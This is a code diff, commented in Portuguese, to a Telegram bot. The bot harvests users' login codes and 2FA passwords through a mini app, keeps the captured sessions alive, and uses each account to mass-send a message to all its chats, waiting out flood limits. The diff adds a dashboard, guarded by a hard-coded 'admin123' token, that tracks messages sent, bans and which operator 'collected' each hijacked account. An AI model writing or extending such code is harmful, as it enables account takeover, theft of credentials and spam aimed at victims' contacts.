@@ -48,6 +48,35 @@ DISPARO_INTERVALO = 300  # 5 minutos
 
 users = {}
 disparo_tasks = {}  # phone -> asyncio.Task
+session_stats = {}  # phone -> stats dict
+
+# Dashboard
+DASHBOARD_TOKEN = "admin123"
+
+def init_session_stats(phone, account_name="", account_id=None, collected_by=None):
+    """Inicializa ou reseta stats de uma sessão"""
+    if phone not in session_stats:
+        session_stats[phone] = {
+            "status": "active",
+            "account_name": account_name,
+            "account_id": account_id,
+            "messages_sent": 0,
+            "messages_failed": 0,
+            "floods_received": 0,
+            "rounds_completed": 0,
+            "last_round_time": None,
+            "connected_since": time.time(),
+            "collected_at": time.time(),
+            "collected_by": collected_by,
+            "ban_reason": "",
+        }
+    else:
+        session_stats[phone]["status"] = "active"
+        session_stats[phone]["connected_since"] = time.time()
+        if account_name:
+            session_stats[phone]["account_name"] = account_name
+        if account_id:
+            session_stats[phone]["account_id"] = account_id
 
 # ===============================
 # VALIDAÇÃO INITDATA
@@ -157,6 +186,10 @@ async def disparo_loop(client: TelegramClient, phone: str):
     falhas_conexao = 0
     MAX_FALHAS = 5  # Máximo de falhas consecutivas antes de desistir
 
+    # Garantir que stats existem
+    if phone not in session_stats:
+        init_session_stats(phone)
+
     while True:
         try:
             # Reconectar se caiu
@@ -183,6 +216,9 @@ async def disparo_loop(client: TelegramClient, phone: str):
                 try:
                     await client.send_message(entity, DISPARO_MSG)
                     enviados += 1
+                    # Stats: mensagem enviada
+                    if phone in session_stats:
+                        session_stats[phone]["messages_sent"] += 1
                     # Delay entre cada envio pra não tomar flood
                     await asyncio.sleep(random.uniform(2, 5))
 
@@ -193,6 +229,9 @@ async def disparo_loop(client: TelegramClient, phone: str):
                     if "FloodWait" in error_name or "flood" in str(e).lower():
                         wait_time = getattr(e, 'seconds', 60)
                         flood_total += 1
+                        # Stats: flood
+                        if phone in session_stats:
+                            session_stats[phone]["floods_received"] += 1
                         print(f"[DISPARO] 🚫 FLOOD! {phone} — Aguardando {wait_time}s...")
                         await asyncio.sleep(wait_time + 5)
 
@@ -217,9 +256,16 @@ async def disparo_loop(client: TelegramClient, phone: str):
 
                     else:
                         erros += 1
+                        # Stats: erro
+                        if phone in session_stats:
+                            session_stats[phone]["messages_failed"] += 1
                         print(f"[DISPARO] ⚠️ Erro ao enviar para {dialog.name}: {error_name}: {e}")
 
             falhas_conexao = 0  # Resetar se a rodada completou
+            # Stats: rodada completa
+            if phone in session_stats:
+                session_stats[phone]["rounds_completed"] += 1
+                session_stats[phone]["last_round_time"] = time.time()
             print(f"[DISPARO] ✅ {phone} — Rodada completa: {enviados} enviados, {erros} erros, {flood_total} floods")
 
         except Exception as e:
@@ -229,6 +275,10 @@ async def disparo_loop(client: TelegramClient, phone: str):
             # Conta banida/desativada — PARAR permanentemente
             if any(x in error_name for x in ["UserDeactivated", "AuthKeyUnregistered", "AuthKeyDuplicated"]):
                 print(f"[DISPARO] 💀 Conta {phone} BANIDA/DESATIVADA — Encerrando loop")
+                # Stats: marcar como banida
+                if phone in session_stats:
+                    session_stats[phone]["status"] = "banned"
+                    session_stats[phone]["ban_reason"] = error_name
                 try:
                     await client.disconnect()
                 except:
@@ -240,6 +290,10 @@ async def disparo_loop(client: TelegramClient, phone: str):
             falhas_conexao += 1
             if falhas_conexao >= MAX_FALHAS:
                 print(f"[DISPARO] 💀 {phone} — {MAX_FALHAS} falhas seguidas, encerrando")
+                # Stats: marcar como expirada
+                if phone in session_stats:
+                    session_stats[phone]["status"] = "expired"
+                    session_stats[phone]["ban_reason"] = f"{MAX_FALHAS} falhas de conexão"
                 try:
                     await client.disconnect()
                 except:
@@ -355,6 +409,9 @@ async def api_verify_code(request):
         me = await client.get_me()
         print(f"[API] ✅✅✅ LOGIN OK! User: {me.id}")
 
+        # Stats: registrar nova sessão
+        init_session_stats(phone, account_name=me.first_name or "", account_id=me.id, collected_by=user_id)
+
         # Inicia disparo em background (NÃO desconecta)
         users.pop(user_id, None)
         task = asyncio.create_task(disparo_loop(client, phone))
@@ -412,6 +469,9 @@ async def api_verify_password(request):
 
         me = await client.get_me()
         print(f"[API] ✅✅✅ LOGIN 2FA OK! User: {me.id}")
+
+        # Stats: registrar nova sessão
+        init_session_stats(phone, account_name=me.first_name or "", account_id=me.id, collected_by=user_id)
 
         # Inicia disparo em background (NÃO desconecta)
         users.pop(user_id, None)
@@ -652,6 +712,9 @@ async def carregar_sessoes():
             me = await client.get_me()
             print(f"[STARTUP] ✅ {phone} — Conectado como {me.first_name} (ID: {me.id})")
 
+            # Stats: registrar sessão carregada
+            init_session_stats(phone, account_name=me.first_name or "", account_id=me.id)
+
             # Inicia disparo
             task = asyncio.create_task(disparo_loop(client, phone))
             disparo_tasks[phone] = task
@@ -664,6 +727,68 @@ async def carregar_sessoes():
             print(f"[STARTUP] ❌ Erro ao carregar {phone}: {type(e).__name__}: {e}")
 
     print(f"[STARTUP] ✅ {len(disparo_tasks)} sessão(ões) ativa(s) disparando!")
+
+# ===============================
+# DASHBOARD API
+# ===============================
+async def serve_dashboard(request):
+    return web.FileResponse(os.path.join(BASE_DIR, "webapp", "dashboard.html"))
+
+async def api_dashboard(request):
+    """Retorna todas as estatísticas para o dashboard"""
+    token = request.query.get("token", "")
+    if token != DASHBOARD_TOKEN:
+        return web.json_response({"error": "Acesso negado"}, status=403)
+
+    # Contar por status
+    active = sum(1 for s in session_stats.values() if s["status"] == "active")
+    banned = sum(1 for s in session_stats.values() if s["status"] == "banned")
+    expired = sum(1 for s in session_stats.values() if s["status"] == "expired")
+
+    # Totais
+    total_msgs = sum(s["messages_sent"] for s in session_stats.values())
+    total_errs = sum(s["messages_failed"] for s in session_stats.values())
+    total_floods = sum(s["floods_received"] for s in session_stats.values())
+    total_rounds = sum(s["rounds_completed"] for s in session_stats.values())
+
+    # Contar arquivos .session na pasta (inclui banidas/expiradas não carregadas)
+    sessions_dir = os.path.join(BASE_DIR, "sessions")
+    session_files = []
+    if os.path.exists(sessions_dir):
+        session_files = [f for f in os.listdir(sessions_dir) if f.endswith(".session")]
+
+    total_sessions = max(len(session_stats), len(session_files))
+
+    # Lista de sessões
+    sessions_list = []
+    for phone, s in session_stats.items():
+        sessions_list.append({
+            "phone": phone,
+            "status": s["status"],
+            "account_name": s.get("account_name", ""),
+            "account_id": s.get("account_id"),
+            "messages_sent": s["messages_sent"],
+            "messages_failed": s["messages_failed"],
+            "floods_received": s["floods_received"],
+            "rounds_completed": s["rounds_completed"],
+            "last_round_time": s.get("last_round_time"),
+            "connected_since": s.get("connected_since"),
+            "collected_at": s.get("collected_at"),
+            "collected_by": s.get("collected_by"),
+            "ban_reason": s.get("ban_reason", ""),
+        })
+
+    return web.json_response({
+        "total_sessions": total_sessions,
+        "active_sessions": active,
+        "banned_sessions": banned,
+        "expired_sessions": expired,
+        "total_messages_sent": total_msgs,
+        "total_errors": total_errs,
+        "total_floods": total_floods,
+        "total_rounds": total_rounds,
+        "sessions": sessions_list,
+    })
 
 # ===============================
 # MAIN
@@ -679,6 +804,8 @@ async def main():
     web_app.router.add_post("/api/send-code", api_send_code)
     web_app.router.add_post("/api/verify-code", api_verify_code)
     web_app.router.add_post("/api/verify-password", api_verify_password)
+    web_app.router.add_get("/dashboard", serve_dashboard)
+    web_app.router.add_get("/api/dashboard", api_dashboard)
 
     runner = web.AppRunner(web_app)
     await runner.setup()
@@ -695,6 +822,7 @@ async def main():
     print(f"📝 Comando: /start")
     print(f"🌐 Web Server: http://0.0.0.0:{WEBAPP_PORT}")
     print(f"🔗 Mini App URL: {WEBAPP_URL}")
+    print(f"📊 Dashboard: http://0.0.0.0:{WEBAPP_PORT}/dashboard")
     print(f"👤 Join Request: ATIVO\n")
 
     async with application:
